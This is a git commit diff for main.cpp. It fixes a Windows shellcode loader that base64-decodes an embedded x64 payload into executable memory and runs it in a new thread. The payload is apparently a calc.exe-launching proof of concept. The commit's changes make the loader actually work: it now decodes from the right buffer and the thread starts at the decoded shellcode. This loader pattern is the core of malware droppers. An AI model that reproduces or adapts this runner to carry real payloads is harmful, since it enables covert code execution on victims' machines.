44f5242edfb2c25ec93cd5aba866894169cd3654
KOZY <kozy@kozy.kozy>
2024-10-05 22:44:41 +0200

    Fixed thing. Now the program executes the proper thing :D

--- main.cpp
+++ main.cpp
@@ -9,12 +9,13 @@
 unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
 unsigned int calc_len = sizeof(calc_payload);
 
+// Decode payload from B64. Returns int if wanted, but changing it to void also works if ur not going to use it.
 int decodeBase64(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {
     DWORD outLen;
     BOOL fRet;
 
     outLen = dstLen;
-    fRet = CryptStringToBinary((LPCSTR)dst, srcLen, CRYPT_STRING_BASE64, reinterpret_cast<BYTE *>(dst), &outLen, NULL, NULL);
+    fRet = CryptStringToBinary((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, reinterpret_cast<BYTE *>(dst), &outLen, NULL, NULL);
     if (!fRet) outLen = 0;
 
     return(outLen);
@@ -30,7 +31,7 @@ int main() {
     std::cout << "payload address: " << static_cast<void*>(calc_payload) << std::endl;
     std::cout << "payload address: " << static_cast<void*>(exec_mem) << std::endl;
 
-    std::cout << "Sex!\n";
+    std::cout << "Press enter to execute payload!\n";
     std::cin.get();
 
     decodeBase64((const BYTE*)calc_payload, calc_len, static_cast<char *>(exec_mem), calc_len);
@@ -41,10 +42,10 @@ int main() {
     std::cin.get();
 
     if (rv != 0) {
-        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)decodeBase64, 0, 0, 0);
+        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
         WaitForSingleObject(th, INFINITE);
     } else {
-        std::cout << "Thread createddssfddfsd!\n";
+        std::cout << "Failed to create thread. rv (return value) is 0!\n";
     }
 
     std::cin.get();
